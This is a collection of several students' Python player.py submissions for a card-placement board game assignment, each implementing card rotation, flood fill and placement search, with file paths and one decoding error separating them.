                self.cardsOnDesk += [ [cords[0], cords[1], card.matrix ] ]
                return [cords[0], cords[1], card.matrix]
            else:
                return []


if __name__ == "__main__":
    """ when you run:
        python3 player.py

        you should get set of .png files with the progress of the game
    """

    tmp = [C44a, C44b, C33a,C33c, C53c, C53b]*1

    p1 = Player("testA", 19, 23, tmp)
    p2 = Player("testB", 19, 23, tmp)

    p2move = []
    gameStep = 0
    while True:
        p1move = p1.play(p2move)
        print("p1 returned", p1move)
        p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))

        p2move = p2.play(p1move)    
        print("p2 returned", p2move)
        p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))
        gameStep += 1
        if p1move == [] and p2move == []:
            print("end of game")
            quit()


    kamartom
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/kamartom______________________
        player.py
import base as BASE
import copy, random, time, sys, os
from PIL import Image, ImageDraw


#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!
C44a = [ [0,1,2,0], 
         [1,1,2,2],
         [2,2,1,1],
         [0,2,1,0] ]  

C44b = [ [0,0,1,0], 
         [1,1,1,0],
         [0,2,2,2],
         [0,2,0,0] ] 

C33a = [ [0,1,0], 
         [1,1,2],
         [0,0,2] ]

C33c = [ [1,2,1], 
         [2,2,2], 
         [1,2,1] ]

C53c = [ [0,1,0], 
         [0,1,0],
         [0,1,1],
         [0,2,2],
         [0,2,0] ]

C53b = [ [0,1,0], 
         [0,1,0],
         [0,1,0],
         [0,1,1],
         [0,0,0] ]



class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "My awesome player"

    def play(self,newCardOnDesk):
        """ this method is called during the game. 
            The input argument newCardOnDesk is:
            - [] if other player didn't place any card in his move), or
            - [row, col, cardMatrix], which informs your player that cardMatrix was placed at row,col to the game board
            
            Return value: 
            - [ row, col, cardMatrix ] if you want to place a card, or
            - [] if no card can be placed 
        """

        #recommened steps 
        #step 0: write newCardOnDesk to list of cards that are on the board game
        #step 1: compute all possible placement of your all (so for available) cards
        #step 2: evaluate each placement, i.e., compute score for it
        #step 3: select card that you want to place to the game board, mark it as used (not available in future)
        #step 4: return your placement, or [] if no placement can be made

## _________________________________________________ Prelimiary checks and controls _________________________________________________ ##

        if  self.cardsOnDesk == [] and newCardOnDesk == []:
            karty = self.cardsAtHand
            self.cardsAtHand = karty[1:]
            newCardOnDesk = karty[0]
            self.cardsOnDesk += [[0, 0, karty[0]]]
            return [0, 0, karty[0]]
        
        if len(newCardOnDesk) == 3:
            self.cardsOnDesk += [ newCardOnDesk ]
        if len(self.cardsAtHand) == 0:
            return []
## _________________________________________________ Beggining of functioning code _________________________________________________ ##

        if self.tournament == True or self.tournament == False :


## _________________________________________________ Better AI for Tournaments _________________________________________________ ##
            def run():
                karty_inp = self.cardsAtHand
                radky = int(self.boardRows)
                sloupce = int(self.boardCols)
                karty = []
                global_poss = []
                temp = []
                res = 0

                for karta in karty_inp:
                    karty.append(karta)
                    temp.append(res)

                    p1 = rotace(karta)
                    #if p1 not in karty:
                    karty.append(p1)
                    temp.append(res)


                    p2 = rotace(p1)
                    #if p2 not in karty:
                    karty.append(p2)
                    temp.append(res)


                    p3 = rotace(p2)
                    #if p3 not in karty:
                    karty.append(p3)
                    temp.append(res)
                    res +=1

                #print(temp)
                deska = [[0]*sloupce for _ in range(radky)]

                for kart in self.cardsOnDesk:

                    r = kart[0]
                    s = kart[1]
                    karta = kart[2]
                    karta_x = len(karta)
                    karta_y = len(karta[0])
                    for x in range(karta_x):
                        for y in range(karta_y):
                            deska[x+r][y+s] = karta[x][y] +1

                
                okraje_deska = make_edges_for_board(deska)

                indexes_clr = [[],[],[],[]]
                for clr in range(2, 6):
                    get_path_filter(okraje_deska,clr, indexes_clr, global_poss)

                kart_info=[[0]for _ in karty]

                for ind in range(len(karty)):
                    kart_info[ind] = analyze_card(karty[ind]) # format [x, y, value we assign for the path, clr, will make (ammount of block under""" needed,and to the sides, to the onther side )]
                i=0
                for x in range(len(kart_info)):
                    for y in range(len(kart_info[x])):
                        kart_info[x][y].append([x,y, temp[i]])
                    i +=1


                index = 0
                resolution_for_poss = [[0] for _ in global_poss]

                for pos in global_poss:
                    resolution_for_poss[index], global_poss = give_cards_to_deska(pos[0:2],pos[2], pos[3], okraje_deska, index, global_poss, kart_info)
                    index +=1

                ret = place_card(okraje_deska, resolution_for_poss, kart_info, global_poss, karty)
                if ret != [0,0,[0]]:
                    kar_ret = self.cardsAtHand[:ret[5]] + self.cardsAtHand[ret[5]+1:]
                    self.cardsAtHand = kar_ret
                    return [ret[0], ret[1], ret[4]]
                else:
                    retu = nul_place(kart_info, okraje_deska, karty)
                    if retu[2]==[0]:
                        return[0,0,[0]]
                    kar_ret = self.cardsAtHand[:retu[3]] + self.cardsAtHand[retu[3]+1:]
                    self.cardsAtHand = kar_ret
                    return [retu[0], retu[1], retu[2]]

        

#########################################################################################################################################
            def nul_place(kart_info ,okraje_deska, karty):
                for ind, kart in enumerate(karty):
                    kart_num = ind //4
                    len_x, len_y = len(kart), len(kart[0])
                    for x in range(len(okraje_deska)):
                        for y in range(len(okraje_deska[0])):
                            possi = False
                            if x+len_x >= len(okraje_deska)+1:
                                break
                            if y+len_y >= len(okraje_deska[0])+1:
                                break
                            possib = True
                            for dx in range(len_x):
                                for dy in range(len_y):
                                    if okraje_deska[x+dx][y+dy]!=0:
                                        possib = False
                            for xx in range(len_x):
                                for yy in range(len_y):
                                    for xx in range(len_x):
                                        
                                        if (y + yy - 1 >= 0 and okraje_deska[x + xx][y + yy - 1] != 0 and okraje_deska[x + xx][y + yy - 1] != 9):
                                            possi = True

                                        if (y + yy + 1 < len(okraje_deska[0]) and okraje_deska[x + xx][y + yy + 1] != 0 and okraje_deska[x + xx][y + yy + 1] != 9):
                                            possi = True

                                        if (x + xx - 1 >= 0 and okraje_deska[x + xx - 1][y + yy] != 0 and okraje_deska[x + xx - 1][y + yy] != 9):
                                            possi = True

                                        if (x + xx + 1 < len(okraje_deska) and okraje_deska[x + xx + 1][y + yy] != 0 and okraje_deska[x + xx + 1][y + yy] != 9):
                                            possi = True
                        
                            if possib == True and possi == True:
                                return[x-1,y-1, kart, kart_num]
                return [0,0,[0]]


            
            def rotace(pole):
                radky = len(pole)
                sloupce = len(pole[0])
                pole_rot = [[0]*radky for i in range(sloupce)]
                max_s = sloupce - 1
                for r in range(radky):
                    for s in range(sloupce):
                        pole_rot[max_s-s][r] = pole[r][s]

                return pole_rot
            
            def make_edges_for_board(deska):
                sloupcu = len(deska[0])
                deska.append([9]*sloupcu)
                deska.insert(0, [9]*sloupcu)

                for radek in range(len(deska)):
                    deska[radek].insert(0,9)
                    deska[radek].append(9)

                return deska
            
            def get_path_filter (deska, clr, indexes_clr, global_poss):
                radku = len(deska)
                sloupcu = len(deska[0])
                path_map = [[0]*sloupcu for _ in range(radku)]
            
                for rad in range(radku):
                    for sl in range(sloupcu):
                        if deska[rad][sl] == clr:
                            path_map[rad][sl] = clr
                        if deska[rad][sl] == 0:
                            path_map[rad][sl] = 1
            
                pos = clr - 2
            
                for rad_ind, rad in enumerate(path_map):
                    for slo_ind, value in enumerate(rad):
                        if value == clr:
                            indexes_clr[pos].append([rad_ind, slo_ind])
                            
                return get_edge_clr_point(path_map, indexes_clr[pos], pos, global_poss)
            def get_edge_clr_point(path_map, vector_list,pos, global_poss):
                for x, y in vector_list:
                    res = has_one(path_map, x, y)
                    truth = False
                    if len(res) > 0:
                        truth = True
                    for ps in res:
                        x_adj = ps[0]
                        y_adj = ps[1]
                        if truth:
                            count = count_touching(path_map, x, y, pos+2)
                            global_poss.append([x_adj, y_adj, count, pos +1])
                return global_poss
            def has_one(matrix, x, y):
                dir = [(-1, 0), (1, 0), (0, -1), (0, 1)]  # Directions: up, down, left, right
                results = []  # List to store results
                for dx, dy in dir:
                    nx, ny = x + dx, y + dy
                    if 0 <= nx < len(matrix) and 0 <= ny < len(matrix[0]) and matrix[nx][ny] == 1:
                        results.append((nx, ny))  # Add the coordinates of adjacent '1's
                return results
            
            def count_touching(path_map, x, y, clr):
                directions = [(-1, 0), (1, 0), (0, -1), (0, 1)]
            
                poz = (x,y)
                stack = [poz]
                visited = set()
                visited.add(poz)
                count = 0
                
                while stack:
                    x, y = stack.pop()
                    count += 1
                    
                    for dx, dy in directions:
                        nx, ny = x + dx, y + dy
                        if is_valid(nx, ny,path_map,clr) and (nx, ny) not in visited:
                            visited.add((nx, ny))
                            stack.append((nx, ny))
                    
                return count
            
            def is_valid(x, y, path_map,clr):
                return 0 <= (x < len(path_map)) and 0 <= (y < len(path_map[0])) and path_map[x][y] == clr
            
            def analyze_card(card):
                radky_len = len(card)
                slo_len = len(card[0])
                cor = []
            
                for rad in range(radky_len):
                    for slo in range(slo_len):
                        if (rad == 0 or rad == radky_len-1  or slo == 0  or slo == slo_len-1) and card[rad][slo] != 0:
                            value_path = path_len(rad, slo, card[rad][slo], card, radky_len, slo_len)
                            directions = count_needed(rad, slo, radky_len,slo_len)
                            clr = card[rad][slo] 
                            cor.append([directions, rad, slo, value_path, clr])
                return cor
            
            def path_len(rad, slo, clr, card, radky_len, slo_len):
                visited = set()
                queue = [(rad, slo)]
                visited.add((rad, slo))
                count = 0
                
                while queue:
                    x, y = queue.pop(0)
                    count += 1
                    for dx, dy in [(0, 1), (1, 0), (0, -1), (-1, 0)]:
                        nx, ny = x + dx, y + dy
                        if (0 <= nx < radky_len and 0 <= ny < slo_len and (nx, ny) not in visited and card[nx][ny] == clr):
                            queue.append((nx, ny))
                            visited.add((nx, ny))
                return count
            
            def count_needed(radek, sloupec, radky_len , slo_len):
                directions = [0, 0, 0, 0]  # up down left right is the order of my dimensions needed
                
                for x in range(radek-1, -1, -1):
                    directions[0] += 1
            
                for x in range(radek+1, radky_len):
                    directions[1] += 1
                
                for y in range(sloupec-1, -1, -1):
                    directions[2] += 1
            
                for y in range(sloupec+1, slo_len):
                    directions[3] += 1
            
                return directions
            def give_cards_to_deska(start, value,clr,deska,ind, global_poss, kart_info): #clr je correct
                start_x, start_y = start
                global_poss[ind] = [count_needed_deska(deska,start_x,start_y),start_x, start_y, value,clr]
                res = []
                for card in kart_info:
                    for barv in card:
                        test =0
                        for i in range(4):
                            if (barv[0][i] <= global_poss[ind][0][i]):
                                test +=1
            
                        if (test == 4) and (global_poss[ind][-1] == barv[-2]):
                            res.append(barv) 
                return res, global_poss
            def count_needed_deska(deska, xs, ys):
                directions = [0, 0, 0, 0]  # up down left right is the order of my dimensions needed X and Y are more like radek and sloupek
            
                for x in range(xs-1, -1, -1):
                    if deska [x][ys] == 0:
                        directions[0] += 1
                    else:
                        break
                for x in range(xs+1, len(deska)):
                    if deska[x][ys] == 0:
                        directions[1] += 1
                    else:
                        break
                for y in range(ys-1, -1, -1):
                    if deska[xs][y]==0:
                        directions[2] += 1
                    else:
                        break
                
                for y in range(ys+1, len(deska[0])):
                    if deska[xs][y] == 0:
                        directions[3] += 1
                    else:
                        break
                return directions
            
            def place_card(desk, cards, kart_info, global_poss, karty):
                placed = []
                for ind in range(len(global_poss)):
                    pos = list([global_poss[ind][1], global_poss[ind][2] , global_poss[ind][4]] )
                    for card in cards[ind]:
                        found = False
                        what_card = card[-1][0]
                        deska = [rad[:] for rad in desk]

                        edge_x = pos[0]-card[0][0]
                        edge_y = pos[1]-card[0][2]


                        karta_vals = karty[what_card]

                        for x in range(len(karta_vals)):
                            for y in range(len(karta_vals[0])):
                                if deska[x+edge_x][y+edge_y] == 0:
                                    deska[x+edge_x][y+edge_y] = karta_vals[x][y] + 1
                                else:
                                    found = True
                                    break
                            if found == True:
                                break
                        if found == True:
                            break 
                        do_card = call(what_card, edge_x,edge_y, deska, kart_info)
                        ret = [edge_x - 1, edge_y - 1, len(karty[what_card]),len(karty[what_card][0]), karty[what_card],card[-1][2] , do_card]
                        placed.append(ret)

                if len(placed) == 0:
                    return [0,0,[0]]

                ret = max(placed, key=lambda element: element[-1])

                return ret

            def call(what_card, edge_x,edge_y, desk, kart_info):
                deska = [rad[:] for rad in desk]
                count_aftr = 0
                for barv in kart_info[what_card]:
                    original_deska = [rad[:] for rad in deska]
            
                    test_x = edge_x + barv[1]
                    test_y = edge_y + barv[2]
                    clr = deska[test_x][test_y]
                    if clr < 0:
                        continue
            
                    count_bfr = sum(num < 0 for rad in deska for num in rad)
                    deska = flood_fill(deska, test_x, test_y, clr)
                    count_aftr = sum(num < 0 for rad in deska for num in rad)
            
            
                    if (count_aftr - count_bfr) == barv[3]:
                        deska = [rad[:] for rad in original_deska]
            
                count = sum(num < 0 for rad in deska for num in rad)
            
                return count
            
            def flood_fill(deska, xs, ys, clr, visited=None):
                #if xs < 0 or ys < 0 or xs >= len(deska) or ys >= len(deska[0]):
                if deska[xs][ys] == 9:
                    return deska
            
                if deska[xs][ys] != clr:
                    return deska
            
                if visited is None:
                    visited = [[False] * len(deska[0]) for _ in range(len(deska))]
                visited[xs][ys] = True
            
                deska[xs][ys] = -clr
            
                for dx, dy in [(-1, 0), (1, 0), (0, -1), (0, 1)]:  
                    flood_fill(deska, xs + dx, ys + dy, clr, visited)
            
                return deska
## _________________________________________________ Commonr return _________________________________________________ ##
        # ending our turn and giving resaults in thsi format required
        row , col, card = run()
        if card == [0]:
            return []
        self.cardsOnDesk += [ [row, col, card ] ]
        return [row, col, card]

## _________________________________________________ Debugging purposses _________________________________________________##
if __name__ == "__main__":
    """ when you run:
        python3 player.py

        you should get set of .png files with the progress of the game
    """
    ## Printing functions and basic game mechanics
    tmp = [C44a, C44b, C33a,C33c, C53c, C53b]*1

    p1 = Player("testA", 19, 23, tmp)
    p2 = Player("testB", 19, 23, tmp)

    p2move = []
    gameStep = 0
    while True:
        p1move = p1.play(p2move)
        print("p1 returned", p1move)
        p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))

        p2move = p2.play(p1move)    
        print("p2 returned", p2move)
        p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))
        gameStep += 1
        if p1move == [] and p2move == []:
            print("end of game")
            quit()    sasonkry
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/sasonkry______________________
        player.py
An error occurred: 'ascii' codec can't decode byte 0xc3 in position 2057: ordinal not in range(128)    stastm28
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/stastm28______________________
        player.py
import base as BASE
import copy, random, time, sys, os, glob, threading
from PIL import Image, ImageDraw


#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!

C44a = [ [0,1,2,0], 
         [1,1,2,2],
         [2,2,1,1],
         [0,2,1,0] ]  
C44b = [ [0,0,1,0], 
         [1,1,1,0],
         [0,2,2,2],
         [0,2,0,0] ] 
C53b = [ [0,1,0], 
         [0,1,0],
         [0,1,0],
         [0,1,1],
         [0,0,0] ]
C53c = [ [0,1,0], 
         [0,1,0],
         [0,1,1],
         [0,2,2],
         [0,2,0] ]
C33a = [ [0,1,0], 
         [1,1,2],
         [0,0,2] ]
C33c = [ [1,2,1], 
         [2,2,2], 
         [1,2,1] ]







def unpack(mat):
    res = []
    for q in mat:
        res.append([])
        for w in q:
            res[-1].append(w)
    return(res)

def rotate(a):
    b = []
    for q in range(len(a[0])-1,-1,-1):
        b.append([])
        for w in range(len(a)):
            b[-1].append(a[w][q])
    return(b)

def addrotations(mat):
    printmat(mat)
    res = [unpack(mat)]
    for q in range(3):
        res.append(rotate(res[-1]))
    return(res)
    



def isabinc(a,b,c):
    for q in c:
        if(q[0] == a and q[1] == b ):return(True)
    return(False)

def isoldsize(a,b,c):
    if(isabinc(a,b,c) == False):
        c.append([a,b])
        if(a != b):
            c.append([b,a])

def findind(a,b,c):
    for q in range(len(c)):
        if(c[q][0] == a and c[q][1] == b ):
            return(q)

def newcardadded(card):
    pass  

def addcard(card,board):
    for q in range(len(card[2])):
        for w in range(len(card[2][0])):
            board[q+card[0]][w+card[1]] = str(card[2][q][w])

def cardsize(cards):
    x = []
    for q in cards:
        isoldsize(len(q),len(q[0]),x)
    return(x)    

def check(bod,size,boardempt):
    #print(bod)
    if(bod[0]< 0):return(False)
    if(bod[1]< 0):return(False)
    if((bod[0]) >= len(boardempt)):return(False)
    if((bod[1]+size[1]) > len(boardempt[0])):return(False)
    for q in range(size[1]):
        if(boardempt[bod[0]][bod[1]+q] < size[0]):return(False)
    return(True)

def findplaces(size,boardempt,card):  
    res = []
    #print(card)
    for q in range(card[3]+size[1]-1):
        if(check([card[0]-size[0],card[1]-(size[1]-1)+q],size,boardempt)):
            res.append([card[0]-size[0],card[1]-(size[1]-1)+q])
    for q in range(card[3]+size[1]-1):
        if(check([card[0]+card[2],card[1]-(size[1]-1)+q],size,boardempt)):
            res.append([card[0]+card[2],card[1]-(size[1]-1)+q])
    for q in range(card[2]+size[0]-1):
        if(check([card[0]+q-(size[0]-1),card[1]-(size[1])],size,boardempt)):
            res.append([card[0]+q-(size[0]-1),card[1]-(size[1])])
    for q in range(card[2]+size[0]-1):
        if(check([card[0]+q-(size[0]-1),card[1]+card[3]],size,boardempt)):
            res.append([card[0]+q-(size[0]-1),card[1]+card[3]])   
    return(res)  

def printmat(mat):
    for q in mat:
        print(q)
    print("")

def setboard(card,board):
    for q in range(card[2]):
        for w in range(card[3]):
            board[card[0]+q][card[1]+w] = 0
            
    for q in range(card[3]):
        x = 1
        while(card[0]-x >= 0):
            if(board[(card[0])-x][card[1]+q] > x):
                board[(card[0])-x][card[1]+q] = x
            x +=1


if(__name__ == "__main__" ):
    import turtle
    turtle.speed(0)
    turtle.ht()

    def box(c):
        size = 20
        colors = ['gray','blue','green','yellow','orange','pink','white']
        turtle.fillcolor(colors[int(c)])
        turtle.begin_fill()
        for q in range(4):
            turtle.forward(size)
            turtle.right(90)
        turtle.end_fill()

    def move(a,b):
        turtle.up()
        turtle.forward(a)
        turtle.right(90)
        turtle.forward(b)
        turtle.left(90)
        turtle.down()

    def home():
        turtle.up()
        turtle.home()
        move(-380,-320)

    def add(a,b):
        c = a[4:]
        for q in range(int(a[2])):
            for w in range(int(a[3])):
                b[int(a[0])+q][int(a[1])+w] = int(c[(q * int(a[3]))+w])

    def pixel(a,b=-380,c=-320):
        turtle.clear()
        turtle.tracer(0,0)
        x = 0
        for q in a:
            #print(q)
            turtle.up()
            turtle.home()
            move(b,c+x)
            x += 20
            for w in q:
                box(w)
                move(20,0)
        turtle.update()
        input()
else:
    def pixel(a):
        pass


class Player(BASE.BasePlayer):
    def timing(self):
        #print("runing",self)
        while(self.runing and self.tim < 5):
            time.sleep(1)
            self.tim += 1
            print(self.tim)
        if(self.runing):
            print("ERROR",self.userLogin)      
                
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        #cardsAtHand = []
        self.playerName = "My awesome player"
        self.board = []
        self.boardempt = []
        self.place = {}
        self.runing = True
        self.tim = 0
        self.t = threading.Thread(target=self.timing)
        self.t.start()
        self.cardsizes = cardsize(cardsAtHand)
        self.cardsandrotations = []
        for q in self.cardsAtHand:
            self.cardsandrotations.append(addrotations(q))
        bigestcard = 0
        for q in range(self.boardRows):
            self.boardempt.append([])
            self.board.append([])
            for w in range(self.boardCols):
                self.boardempt[-1].append(self.boardRows-q)
                self.board[-1].append("-1")
        for q in self.cardsizes:
            if(q[0] > bigestcard):
                bigestcard = q[0]
        for q in self.cardsizes:
            if((q[0] in self.place) == False):
                self.place.update({q[0]:{}})
            self.place[q[0]].update({q[1]:[]})
        """
            for w in self.place[q]:
                print(q,w,self.place[q][w])    
        print("")    
        #"""
                
                
                
                
      
                
                
                
                
                
                
        
        

            









    #exit()
    def playable(self):
        res = []
        for q in range(len(self.cardsandrotations)):
            for w in range(2):
                card = self.cardsandrotations[q][w]
                cardRows = len(card)
                cardCols = len(card[0])
                if(len(self.place[cardRows][cardCols]) > 0):
                    res.append([q,w])
                    res.append([q,w+2])
        return(res)

    def play(self,newCardOnDesk):   
        #print(self.tim)     
        """ this method is called during the game. 
            The input argument newCardOnDesk is:
            - [] if other player didn't place any card in his move), or
            - [row, col, cardMatrix], which informs your player that cardMatrix was placed at row,col to the game board
            
            Return value: 
            - [ row, col, cardMatrix ] if you want to place a card, or
            - [] if no card can be placed 
        

        #recommened steps 
        #step 0: write newCardOnDesk to list of cards that are on the board game
        #step 1: compute all possible placement of your all (so for available) cards
        #step 2: evaluate each placement, i.e., compute score for it
        #step 3: select card that you want to place to the game board, mark it as used (not available in future)
        #step 4: return your placement, or [] if no placement can be made
        #the following code DOES NOT provides correct moves, 
        #it just return random card at random position
        """
        
        if len(newCardOnDesk) == 3:
            self.cardsOnDesk += [ newCardOnDesk ]
            addcard(newCardOnDesk,self.board)
            setboard([newCardOnDesk[0],newCardOnDesk[1],len(newCardOnDesk[2]),len(newCardOnDesk[2][0])],self.boardempt)
        pixel(self.board)


        if len(self.cardsandrotations) == 0:
            self.runing = False
            return []
        
        #printmat(self.boardempt)
        if(len(self.cardsOnDesk) > 0):
            board2 = unpack(self.board)
            for q in self.cardsizes:
                self.place[q[0]][q[1]] = []
                for card in self.cardsOnDesk:
                    #print(q)
                    for e in findplaces(q,self.boardempt,[card[0],card[1],len(card[2]),len(card[2][0])]):
                        self.place[q[0]][q[1]].append(e)
                    
                    #print(findplaces(q,self.boardempt,[card[0],card[1],len(card[2]),len(card[2][0])]))
        else: print("firstmove",self.userLogin)
        
        if(len(self.cardsOnDesk) > 0):
            cardindxs = self.playable()
            printmat(cardindxs)
            if(len(cardindxs) == 0):
                return([])
            q = random.randint(0,len(cardindxs)-1)
            cardindx = cardindxs[q]
            card = self.cardsandrotations[cardindx[0]][cardindx[1]]
            cardRows = len(card)
            cardCols = len(card[0])
            if(__name__ == "__main__"):
                for q in self.place[cardRows][cardCols]:
                    board2[q[0]][q[1]] = 5
                pixel(board2)
            x = random.randint(0,len(self.place[cardRows][cardCols])-1)
            row = self.place[cardRows][cardCols][x][0]
            col = self.place[cardRows][cardCols][x][1]
        else:
            cardindx = [random.randint(0, len(self.cardsandrotations)-1),0]
            card = self.cardsandrotations[cardindx[0]][cardindx[1]]
            cardRows = len(card)
            cardCols = len(card[0])
            row = random.randint(0, self.boardRows-cardRows-1) 
            col = random.randint(0, self.boardCols-cardCols-1)
        self.cardsandrotations = self.cardsandrotations[:cardindx[0]] + self.cardsandrotations[cardindx[0]+1:]  #remove selected card so its not used in future
        self.cardsOnDesk += [[ row, col, card ]] 
        addcard([ row, col, card ],self.board)
        setboard([row, col, len(card), len(card[0])],self.boardempt)
        return [ row, col, card ]
        #self.cardsOnDesk += [ [self.place[cardRows][cardCols][x]* card ] ]
        #addcard([self.place[cardRows][cardCols][x]* card ],self.board)
        #return [self.place[cardRows][cardCols][x]* card ]


if(__name__ == "__main__"):
    """ when you run:
        python3 player.py

        you should get set of .png files with the progress of the game
    """

    tmp = [C44a, C44b, C33a,C33c, C53c, C53b]*4

    p1 = Player("testA", 19, 23, tmp)
    #exit()
    p2 = Player("testB", 19, 23, tmp)

    p2move = []
    gameStep = 0
    
    
    #files = glob.glob('./OUTS/*')
    for q in glob.glob('./OUTS/*'):
        os.remove(q)
    
    while True:
        p1move = p1.play(p2move)
        print("p1 returned", p1move)
        p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))

        p2move = p2.play(p1move)    
        print("p2 returned", p2move)
        p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))
        gameStep += 1
        if p1move == [] and p2move == []:
            print("end of game")
            for q in p1.cardsOnDesk:
                print(q[0],q[1],len(q[2]),len(q[2][0]))
            #for q in globals():
            #    print(q)
            quit()


    vondrkl1
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/vondrkl1______________________
        player.py
import base as BASE
import copy, random, time, sys, os
from PIL import Image, ImageDraw


#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!

def getPossiblePositions(heightC, widthC):
    points = []
    for r in range(R - heightC + 1):
        for c in range(C - widthC + 1): 
            def a():
                isValid = False
                for rm in range(heightC):
                    for cm in range(widthC):
                        if field[r + rm][c + cm] > -1:
                            return
                        if  (rm == 0            and r > 0           and field[r + rm - 1][c + cm] > -1) or \
                            (rm == heightC - 1  and r < R - heightC and field[r + rm + 1][c + cm] > -1) or \
                            (cm == 0            and c > 0           and field[r + rm][c + cm - 1] > -1) or \
                            (cm == widthC - 1   and c < C - widthC  and field[r + rm][c + cm + 1] > -1):
                            isValid = True
                if isValid:
                    points.append([r, c])
            a()
    return(points)

def fill(x, y, new, mmatrix):
    number = 1
    stack = [(x, y)]
    old = mmatrix[x][y]
    mmatrix[x][y] = new
    if old == new:
        return None, 0

    while (len(stack) != 0):
        x, y = stack.pop()
        move = [(0, -1),(0, 1),(-1, 0),(1, 0)]
        for i in move:
            nx, ny = x + i[0], y + i[1]
            if nx < len(mmatrix) and ny < len(mmatrix[0]) and ny > -1 and nx > -1 and mmatrix[nx][ny] == old:
                stack.append((nx, ny))
                mmatrix[nx][ny] = new
                number += 1
    return mmatrix, number

def fillCount(x, y, new, matrix):
    matrix, number = fill(x, y, new, matrix)
    return number

def writeInFieldG(imp):
    if imp == []:
        return None
    ri, ci, mat = imp
    for i in range(len(mat)):
        for j in range(len(mat[0])):
            field[ri + i][ci + j] = mat[i][j]

class Card:
    def __init__(self, matrixi):
        self.R = len(matrixi)
        self.C = len(matrixi[0])
        self.matrix = matrixi
            
        self.rotations = []
        self.rotations.append(self.matrix)
        for k in range(3):
            new_matrix = [[self.rotations[k][j][i] for j in range(len(self.rotations[k]))] for i in range(len(self.rotations[k][0])-1,-1,-1)]
            self.rotations.append(new_matrix)

    def writeInField(self, ri, ci, maxsize, rotation = 0):
        for i in range(self.R):
            for j in range(self.C):
                field[ri + i][ci + j] = self.rotations[rotation][i][j]

    def getMatrix(self):
        return self.matrix

    
    
    def getBestPos(self):
        listpos = dict()
        listpos[self.R] = getPossiblePositions(self.R, self.C)
        if not self.R == self.C:
            listpos[self.C] = getPossiblePositions(self.C, self.R)

        fieldForNow = [row[:] for row in field]

        best = [0, -1, -1, -1]

        for r in range(len(self.rotations)):
            rotation = self.rotations[r]
            rr, cr = len(rotation), len(rotation[0])
            positions = listpos[len(rotation)]
            startPoint = []
            matrixCopy = [row[:] for row in rotation]

            for i in range(rr):
                for j in range(cr):
                    if matrixCopy[i][j] > 0:
                        matrixCopy, count = fill(i, j, 0, matrixCopy)
                        startPoint.append([i, j, count])

            for position in positions:
                for i in range(rr):
                    for j in range(cr):
                        fieldForNow[position[0] + i][position[1] + j] = rotation[i][j]
                scount = 0
                for k in startPoint:
                    count = fillCount(k[0] + position[0], k[1] + position[1], 0, fieldForNow)
                    if count > k[2]:
                        scount += count
                    if scount >= best[0]:
                        best = [scount, position[0], position[1], r]
                fieldForNow = [row[:] for row in field]

        if best[3] == -1:
            return [-1]

        return [best[0], best[1], best[2], self.rotations[best[3]]]

R, C, field = 0, 0, []

class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "Wowbagger, the Infinitely Prolonged"
        global R 
        R = boardRows
        global C 
        C = boardCols
        global field
        self.cardsMy = list()
        field = [[-1 for _ in range(C)] for _ in range(R)]
        for card in cardsAtHand:
            self.cardsMy.append(Card(card))
        self.first = True

    def play(self, newCardOnDesk):
        if len(self.cardsMy) == 0:
            return []
        writeInFieldG(newCardOnDesk)

        if len(newCardOnDesk) == 3:
            self.cardsOnDesk += [ newCardOnDesk ]


        best = -1
        card = 0
        for i in range(len(self.cardsMy)):
            result = self.cardsMy[i].getBestPos()
            if result[0] > best:
                best = result[0]
                card = i
                ri, ci, mat = result[1], result[2], result[3]

        if best == -1 and not self.first:
            return[]
        elif best == -1 and self.first:
            cardindx = random.randint(0, len(self.cardsAtHand)-1)  #random index of a card
            card = self.cardsAtHand[cardindx]
            cardRows = len(card)
            cardCols = len(card[0])
            row = random.randint(0, self.boardRows-cardRows-1) 
            col = random.randint(0, self.boardCols-cardCols-1)
            self.cardsAtHand = self.cardsAtHand[:cardindx] + self.cardsAtHand[cardindx+1:]  #remove selected card so its not used in future
            self.cardsMy.pop(cardindx)
            self.cardsOnDesk += [ [row, col, card ] ]
            writeInFieldG([row, col, card])
            self.first = False
            return [row, col, card ]



            matt = self.cardsMy.pop()
            matt = matt.getMatrix()
            self.first = False
            self.cardsOnDesk += [ [0, 0, matt ] ]
            writeInFieldG([0, 0, matt])
            return[0, 0, matt]
        else:
            self.cardsMy.pop(card)
            self.first = False
            print(best)
            #return[]
            self.cardsOnDesk += [ [ri, ci, mat ] ]
            writeInFieldG([ri, ci, mat])
            return[ri, ci, mat]
    havamart
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/havamart______________________
        player.py
import base as BASE

def checkSpot(r_corner, s_corner, r_size, s_size, field, r_field, s_field): #zkontroluje legalitu tahu
    touch = False
    for k in range(r_size):
        if field[r_corner + k][s_corner] != "." or field[r_corner + k][s_corner + s_size - 1] != ".":
            return False
        if not touch:
            if ((s_corner - 1) >= 0 and field[r_corner + k][s_corner - 1] != ".") or ((s_corner + s_size) <= (s_field - 1) and field[r_corner + k][s_corner + s_size] != "."):
                touch = True
    for k in range(s_size):
